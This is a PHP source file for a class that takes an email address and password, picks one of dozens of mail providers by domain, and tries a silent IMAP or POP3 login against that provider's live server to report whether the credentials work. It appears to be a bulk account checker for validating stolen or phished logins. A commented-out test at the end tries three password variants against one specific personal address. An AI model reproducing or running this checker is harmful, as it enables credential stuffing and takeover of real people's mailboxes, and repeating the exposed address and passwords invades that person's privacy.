<?php


 
class Mail{
	private $email;
	private $pwd;
	
	public function __construct(){
		$this->email = "";
		$this->pwd = "";
	}
	
	public function check($email, $pwd){
		$this->email = $email;
		$this->pwd = $pwd;
		list($username, $domain) = explode('@', $this->email);
		$domain = strtolower($domain);
		if(strpos($domain,'yahoo.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'ymail.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'rocketmail.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'att.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'bellsouth.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'ameritech.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'sbcglobal.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'btinternet.') !== false){
			return $this->check_yahoo();
		}elseif(strpos($domain,'gmail.') !== false){
			return $this->check_gmail();
		}elseif(strpos($domain,'googlemail.') !== false){
			return $this->check_gmail();
		}elseif(strpos($domain,'aol.') !== false){
			return $this->check_aol();
		}elseif(strpos($domain,'love.') !== false){
			return $this->check_aol();
		}elseif(strpos($domain,'games.') !== false){
			return $this->check_aol();
		}elseif(strpos($domain,'aim.') !== false){
			return $this->check_aim();	
		}elseif(strpos($domain,'me.') !== false){
			return $this->check_me();
		}elseif(strpos($domain,'mac.') !== false){
			return $this->check_me();
		}elseif(strpos($domain,'live.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'hotmail.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'msn.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'compaq.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'messengeruser.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'passport.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'webtv.') !== false){
			return $this->check_hotmail();
		}elseif(strpos($domain,'1and1.') !== false){
			return $this->check_1and1();
		}elseif(strpos($domain,'airmail.') !== false){
			return $this->check_airmail();
		}elseif(strpos($domain,'cableone') !== false){
			return $this->check_optonline();
		}elseif(strpos($domain,'cablevision') !== false){
			return $this->check_gmail();
		}elseif(strpos($domain,'centurylink.') !== false){
			return $this->check_centurylink();
		}elseif(strpos($domain,'charter.') !== false){
			return $this->check_charter();
		}elseif(strpos($domain,'clearwire.') !== false){
			return $this->check_gmail();
		}elseif(strpos($domain,'comcast.') !== false){
			return $this->check_comcast();
		}elseif(strpos($domain,'comnetcom') !== false){
			return $this->check_comnetcom();
		}elseif(strpos($domain,'compuserve') !== false){
			return -1;	
		}elseif(strpos($domain,'cs.com') !== false){
			return -1;	
		}elseif(strpos($domain,'coqui.') !== false){
			return -1;	
		}elseif(strpos($domain,'covad.') !== false){
			return -1;	
		}elseif(strpos($domain,'cox.net') !== false){
			return $this->check_cox();
		}elseif(strpos($domain,'coxmail') !== false){
			return $this->check_coxmail();
		}elseif(strpos($domain,'earthlink') !== false){
			return $this->check_earthlink();
		}elseif(strpos($domain,'embarq') !== false){
			return $this->check_centurylink();
		}elseif(strpos($domain,'excite') !== false){
			return -1;	
		}elseif(strpos($domain,'frontier') !== false){
			return -1;	
		}elseif(strpos($domain,'grandecom') !== false){
			return -1;	
		}elseif(strpos($domain,'netcom') !== false){
			return -1;	
		}elseif(strpos($domain,'insightbb') !== false){
			return -1;	
		}elseif(strpos($domain,'juno.') !== false){
			return $this->check_juno();	
		}elseif(strpos($domain,'mail.com') !== false){
			return -1;	
		}elseif(strpos($domain,'mediacom') !== false){
			return -1;	
		}elseif(strpos($domain,'mindspring') !== false){
			return -1;	
		}elseif(strpos($domain,'netaddress') !== false){
			return -1;	
		}elseif(strpos($domain,'netzero') !== false){
			return $this->check_netzero();	
		}elseif(strpos($domain,'netscape') !== false){
			return -1;	
		}elseif(strpos($domain,'optonline') !== false){
			return $this->check_optonline();
		}elseif(strpos($domain,'pipeline') !== false){
			return -1;	
		}elseif(strpos($domain,'sky.') !== false){
			return $this->check_sky();	
		}elseif(strpos($domain,'qwest') !== false){
			return $this->check_qwest();	
		}elseif(strpos($domain,'rr.com') !== false){
			return -1;	
		}elseif(strpos($domain,'surewest') !== false){
			return -1;	
		}elseif(strpos($domain,'verizon.net') !== false){
			return $this->check_verizon();
		}elseif(strpos($domain,'us.army.mil') !== false){
			return $this->check_usarmy();
		}elseif(strpos($domain,'talktalk') !== false){
			return $this->check_talktalk();
		}elseif(strpos($domain,'ntlworld') !== false){
			return $this->check_ntlworld();
		}elseif(strpos($domain,'blueyonder') !== false){
			return $this->check_blueyonder();
		}elseif(strpos($domain,'virgin.net') !== false){
			return $this->check_virgin();
		}elseif(strpos($domain,'virginmedia') !== false){
			return $this->check_virginmedia();
		}elseif(strpos($domain,'optimum') !== false){
			return $this->check_optimum();
		}elseif(strpos($domain,'postmaster') !== false){
			return $this->check_postmaster();
		}elseif(strpos($domain,'wavecable') !== false){
			return -1;
		}elseif(strpos($domain,'windstream') !== false){
			return -1;
		}else{
			return -1;
		}
	}
	
	
	private function connect_imap($host, $port = 993, $ssl = '/ssl'){
		$hostname = '{' . $host . ':' . $port . '/imap' . $ssl . '}INBOX';
        
		imap_timeout(IMAP_OPENTIMEOUT, 5);
		$imap = @imap_open($hostname, $this->email, $this->pwd, OP_READONLY, 0);
        
		if(!$imap){
			$result = imap_last_error();
		}else{
			$result = 'OK';
		}
        
		@imap_close($imap);
        
        if($result=='OK'){
            return 1;
        }
        
		return $result;
	}
	
	private function connect_pop3($host, $port = 995, $ssl = '/ssl'){
		$hostname = '{' . $host . ':' . $port . '/pop3' . $ssl . '}INBOX';
        
		imap_timeout(IMAP_OPENTIMEOUT, 5);
		$imap = @imap_open($hostname, $this->email, $this->pwd, NULL, 0);
        
		if(!$imap){
			$result = imap_errors();
		}else{
			$result = 'OK';
		}
        
		@imap_close($imap);
        
        if(is_array($result)){
            return $result[0];
        }
        
		return 1;
	}
    
    private function check_netzero(){
        return $this->connect_pop3('pop.netzero.com');
    }
    
    private function check_postmaster(){
        return $this->connect_imap('imap.postmaster.co.uk');
    }
    
	private function check_ntlworld(){
	   return $this->connect_imap('imap.ntlworld.com');
	}
    
    private function check_blueyonder(){
	   return $this->connect_imap('imap4.blueyonder.co.uk');
	}
    
    private function check_virgin(){
	   return $this->connect_imap('imap4.virgin.net');
	}
    
    private function check_virginmedia(){
	   return $this->connect_imap('imap.virginmedia.com');
	}
        
    private function check_talktalk(){
        return $this->connect_imap('mail.talktalk.net', 143, '');
    }
    
	private function check_yahoo(){
		return $this->connect_imap('imap.mail.yahoo.com');
	}
	
	private function check_gmail(){
		return $this->connect_imap('imap.gmail.com');
	}
	
	private function check_aol(){
		return $this->connect_imap('imap.aol.com');
	}
	
	private function check_aim(){
		return $this->connect_imap('imap.aim.com', 143, '');
	}
	
	private function check_me(){
		return $this->connect_imap('imap.mail.me.com');
	}
	
	private function check_hotmail(){
		return $this->connect_pop3('pop3.live.com');
	}
	
	private function check_1and1(){
		return $this->connect_imap('imap.1and1.com');
	}
	
	private function check_airmail(){
		return $this->connect_imap('imap.airmail.net', 143, '');
	}
    
    private function check_optonline(){
		return $this->connect_pop3('mail.optonline.net', 110, '');
	}
	
    private function check_optimum(){
		return $this->connect_pop3('mail.optimum.net', 110, '');
	}
    
	private function check_juno(){
		return $this->connect_pop3('pop.juno.com');
	}
	
	private function check_verizon(){
		return $this->connect_pop3('pop.verizon.net');
	}
	
	private function check_sky(){
	 	return $this->connect_imap('imap.tools.sky.com');
	}
	
	private function check_usarmy(){
	 	return $this->connect_imap('imap.us.army.mil');
	}
	
	private function check_qwest(){
		return $this->connect_pop3('pop.mpls.qwest.net', 110, '');
	}
	
	private function check_earthlink(){
		return $this->connect_pop3('pop.earthlink.net', 110, '');
	}
	
	private function check_coxmail(){
		return $this->connect_imap('imap.coxmail.com');
	}
	
	private function check_cox(){
		return $this->connect_pop3('pop.cox.net', 110, '');
	}
	
	private function check_comnetcom(){
		return $this->connect_pop3('pop.comnetcom.net', 110, '');
	}
	
	private function check_comcast(){
		return $this->connect_pop3('mail.comcast.net', 110, '');
	}
	
	private function check_charter(){
		return $this->connect_imap('IMAP.charter.net', 143, '');
	}
	
	private function check_centurylink(){
		return $this->connect_pop3('pop.centurylink.net');
	}
}
/* $mail = new Mail();

echo $mail->check('lbwamilliner@btinternet.com','tessie113');
echo $mail->check('lbwamilliner@btinternet.com','tessie11');
echo $mail->check('lbwamilliner@btinternet.com','tessie112'); */
